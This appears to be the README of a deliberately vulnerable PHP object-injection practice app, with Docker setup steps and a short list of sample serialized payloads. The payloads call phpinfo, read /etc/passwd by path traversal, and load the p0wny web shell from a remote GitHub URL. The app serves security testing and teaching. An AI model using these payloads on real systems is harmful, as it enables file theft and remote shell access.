# PHP Object Injection playground

A simple exhibition application which suffers from multiple object injection vulnerabilities. Application runs under 
various versions of php simultaneously. Created just for testing purposes.

PHP versions: 
 * PHP 5.6
 * PHP 7.1
 * PHP 7.3

You can easily change the active version of php from the top right menu of the web app.
## Requirements
 * Docker

## Starting the app
```bash
$ docker-compose up -d
```

It will start 4 containers 
 * NGINX
 * PHP 5.6
 * PHP 7.1
 * PHP 7.3

## Vulnerability types
 * GET/POST Params and forms
 * COOKIES
 * HEADERS
 
## Payload samples
 * O:19:"Components\Evaluate":1:{s:5:"param";s:7:"phpinfo";}
 * O:15:"Components\File":1:{s:8:"filename";s:31:"../../../../../../../etc/passwd";}
 * O:15:"Components\File":1:{s:8:"filename";s:68:"https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php";}
 
 ## Authors
 * **georlav** - *Initial work*
 